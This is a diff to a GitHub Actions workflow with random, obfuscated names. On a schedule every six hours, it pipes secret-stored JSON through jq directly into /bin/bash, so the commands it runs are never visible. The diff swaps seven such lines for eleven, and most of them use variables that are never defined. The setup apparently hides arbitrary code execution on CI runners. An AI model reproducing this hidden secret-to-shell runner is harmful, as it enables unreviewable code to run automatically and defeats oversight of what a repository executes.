@@ -1,24 +1,28 @@
 name: xujiandu4675
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 4/6 * * *'
+    - cron: '33 5/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: xujiandu4675
         env:
-          l6: ${{ secrets.l6 }}
+          vdg41: ${{ secrets.vdg41 }}
         run: |
-          echo $l6 | jq -r .uxn89 | /bin/bash
-          echo $kw9 | jq -r .e5 | /bin/bash
-          echo $oot60209 | jq -r .qtw0820 | /bin/bash
-          echo $cag1 | jq -r .ky441 | /bin/bash
-          echo $hzpx51 | jq -r .jxp98 | /bin/bash
-          echo $dhxm96181 | jq -r .khp6 | /bin/bash
-          echo $qtdkt2 | jq -r .ey9 | /bin/bash
+          echo $vdg41 | jq -r .qqlu82 | /bin/bash
+          echo $clk4816 | jq -r .nr7 | /bin/bash
+          echo $jzpos7 | jq -r .vd05770 | /bin/bash
+          echo $squmv70 | jq -r .tqef238 | /bin/bash
+          echo $qhe82 | jq -r .qn6 | /bin/bash
+          echo $optz42396 | jq -r .a19617 | /bin/bash
+          echo $lan8 | jq -r .bvme67 | /bin/bash
+          echo $rmswu4 | jq -r .kj83510 | /bin/bash
+          echo $jrg85 | jq -r .khyfb5244 | /bin/bash
+          echo $sa30341 | jq -r .jq2628 | /bin/bash
+          echo $zf8 | jq -r .as307 | /bin/bash
 
